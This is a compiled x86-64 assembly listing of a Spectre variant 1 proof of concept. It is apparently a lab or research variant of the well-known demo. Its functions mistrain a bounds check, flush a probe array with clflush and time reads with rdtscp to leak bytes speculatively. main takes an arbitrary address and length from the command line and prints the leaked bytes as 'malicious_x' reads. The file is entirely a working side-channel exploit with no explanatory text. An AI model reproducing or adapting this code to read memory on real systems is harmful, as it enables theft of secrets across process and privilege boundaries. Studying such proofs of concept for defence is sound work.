	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movsxd	rcx, dword ptr [rip + array1_size]
	xor	eax, eax
	cmp	rcx, rdi
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movsxd	rax, dword ptr [rip + array1_size]
	cmp	rax, rdi
	jbe	.LBB1_10
# %bb.1:
	mov	r8d, edi
	add	r8d, -1
	js	.LBB1_10
# %bb.2:
	mov	al, byte ptr [rip + temp]
	and	edi, 3
	je	.LBB1_3
# %bb.4:
	lea	r9, [rip + array1]
	lea	rdx, [rip + array2]
	mov	ecx, r8d
	.p2align	4, 0x90
.LBB1_5:                                # =>This Inner Loop Header: Depth=1
	mov	esi, ecx
	movzx	esi, byte ptr [rsi + r9]
	shl	rsi, 9
	and	al, byte ptr [rsi + rdx]
	add	ecx, -1
	add	edi, -1
	jne	.LBB1_5
# %bb.6:
	cmp	r8d, 3
	jae	.LBB1_7
	jmp	.LBB1_9
.LBB1_3:
	mov	ecx, r8d
	cmp	r8d, 3
	jb	.LBB1_9
.LBB1_7:
	lea	rdx, [rip + array1]
	lea	rsi, [rip + array2]
	.p2align	4, 0x90
.LBB1_8:                                # =>This Inner Loop Header: Depth=1
	mov	edi, ecx
	movzx	edi, byte ptr [rdi + rdx]
	shl	rdi, 9
	and	al, byte ptr [rdi + rsi]
	lea	edi, [rcx - 1]
	movzx	edi, byte ptr [rdi + rdx]
	shl	rdi, 9
	and	al, byte ptr [rdi + rsi]
	lea	edi, [rcx - 2]
	movzx	edi, byte ptr [rdi + rdx]
	shl	rdi, 9
	and	al, byte ptr [rdi + rsi]
	lea	edi, [rcx - 3]
	movzx	edi, byte ptr [rdi + rdx]
	shl	rdi, 9
	and	al, byte ptr [rdi + rsi]
	lea	edi, [rcx - 4]
	cmp	ecx, 3
	mov	ecx, edi
	jg	.LBB1_8
.LBB1_9:
	mov	byte ptr [rip + temp], al
.LBB1_10:
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 24
	.cfi_def_cfa_offset 80
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 16], rdi       # 8-byte Spill
	lea	r14, [rip + results]
	mov	edx, 1024
	mov	rdi, r14
	xor	esi, esi
	call	memset@PLT
	mov	eax, 999
	lea	r12, [rip + array2]
	jmp	.LBB2_1
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	lea	eax, [r8 - 1]
	cmp	r8d, 1
                                        # kill: def $eax killed $eax def $rax
	jbe	.LBB2_12
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_7 Depth 2
	mov	rbx, r14
	xor	ecx, ecx
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [rcx + r12]
	clflush	byte ptr [rcx + r12 + 512]
	clflush	byte ptr [rcx + r12 + 1024]
	clflush	byte ptr [rcx + r12 + 1536]
	clflush	byte ptr [rcx + r12 + 2048]
	clflush	byte ptr [rcx + r12 + 2560]
	clflush	byte ptr [rcx + r12 + 3072]
	clflush	byte ptr [rcx + r12 + 3584]
	add	rcx, 4096
	cmp	rcx, 131072
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	rbp, rax
                                        # kill: def $eax killed $eax killed $rax
	cdq
	idiv	dword ptr [rip + array1_size]
	mov	r15d, edx
	mov	r13, r15
	xor	r13, qword ptr [rsp + 16]       # 8-byte Folded Reload
	mov	r14d, 29
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	mov	eax, r14d
	mov	ecx, 2863311531
	imul	rax, rcx
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	not	eax
	add	eax, r14d
	and	eax, -65536
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r13
	xor	rdi, r15
	call	victim_function
	sub	r14d, 1
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rsp + 12], 0
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 99
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [rsp + 12], 1
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 100
	jl	.LBB2_13
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	mov	edi, 13
	mov	r14, rbx
	mov	r8, rbp
	lea	r9, [rip + array1]
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	add	edi, 167
	cmp	edi, 42765
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzx	ebx, dil
	mov	rbp, rbx
	shl	rbp, 9
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	movzx	eax, byte ptr [rbp + r12]
	rdtscp
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 50
	ja	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, r8d
	cdq
	idiv	dword ptr [rip + array1_size]
                                        # kill: def $edx killed $edx def $rdx
	cmp	dil, byte ptr [rdx + r9]
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, ebx
	add	dword ptr [r14 + 4*rax], 1
	jmp	.LBB2_10
.LBB2_12:
	xor	dword ptr [rip + results], ecx
	add	rsp, 24
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 32], rsi       # 8-byte Spill
	mov	dword ptr [rsp + 28], edi       # 4-byte Spill
	mov	r14, qword ptr [rip + stdin@GOTPCREL]
	lea	r15, [rip + .L.str.6]
	lea	rbp, [rip + results]
	lea	r12, [rip + .L.str.7]
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_1 Depth=1
	xor	eax, eax
	call	getpid@PLT
	lea	rdi, [rip + .L.str.9]
	lea	rsi, [rip + check+33]
	mov	edx, eax
	xor	eax, eax
	call	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
	mov	rdi, qword ptr [r14]
	call	getc@PLT
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_14
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_15
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rdx, qword ptr [rip + secret]
	lea	rdi, [rip + .L.str.1]
	mov	rsi, rdx
	xor	eax, eax
	call	printf@PLT
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	lea	rcx, [rip + array1]
	sub	rax, rcx
	mov	qword ptr [rsp + 16], rax
	call	strlen@PLT
	mov	rbx, rax
	mov	dword ptr [rsp + 12], ebx
	mov	edx, 131072
	lea	rdi, [rip + array2]
	mov	esi, 1
	call	memset@PLT
	cmp	dword ptr [rsp + 28], 3         # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rbx, qword ptr [rsp + 32]       # 8-byte Reload
	mov	rdi, qword ptr [rbx + 8]
	lea	rsi, [rip + .L.str.2]
	lea	rdx, [rsp + 16]
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	lea	rax, [rip + array1]
	sub	qword ptr [rsp + 16], rax
	mov	rdi, qword ptr [rbx + 16]
	lea	rsi, [rip + .L.str.3]
	lea	rdx, [rsp + 12]
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	mov	rsi, qword ptr [rsp + 16]
	mov	edx, dword ptr [rsp + 12]
	lea	rdi, [rip + .L.str.4]
	xor	eax, eax
	call	printf@PLT
	mov	ebx, dword ptr [rsp + 12]
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	lea	rdi, [rip + .L.str.5]
	mov	esi, ebx
	xor	eax, eax
	call	printf@PLT
	mov	eax, dword ptr [rsp + 12]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 12], ecx
	test	eax, eax
	jle	.LBB3_1
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xor	ebx, ebx
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_8 Depth=2
	add	rbx, 1
	mov	edi, 10
	call	putchar@PLT
	mov	eax, dword ptr [rsp + 12]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 12], ecx
	test	eax, eax
	jle	.LBB3_1
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
	mov	rsi, qword ptr [rsp + 16]
	mov	rax, qword ptr [rip + secret]
	movsx	ecx, byte ptr [rax + rbx]
	mov	rdi, r15
	mov	edx, ecx
	xor	eax, eax
	call	printf@PLT
	mov	rdi, qword ptr [rsp + 16]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 16], rax
	call	readMemoryByte
	xor	r13d, r13d
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_9 Depth=3
	add	r13, 1
	cmp	r13, 255
	je	.LBB3_13
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	mov	edx, dword ptr [rbp + 4*r13]
	mov	eax, edx
	sub	eax, dword ptr [rbp + 4*r13 + 4]
	jle	.LBB3_12
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=3
	cmp	eax, 101
	jl	.LBB3_12
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	mov	rdi, r12
	mov	esi, r13d
	xor	eax, eax
	call	printf@PLT
	mov	edx, dword ptr [rbp + 4*r13 + 4]
	lea	esi, [r13 + 1]
	mov	rdi, r12
	xor	eax, eax
	call	printf@PLT
	jmp	.LBB3_12
.LBB3_15:
	xor	eax, eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	results,@object                 # @results
	.local	results
	.comm	results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.size	.L.str.6, 55

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"result[%d]=%d "
	.size	.L.str.7, 15

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.9, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
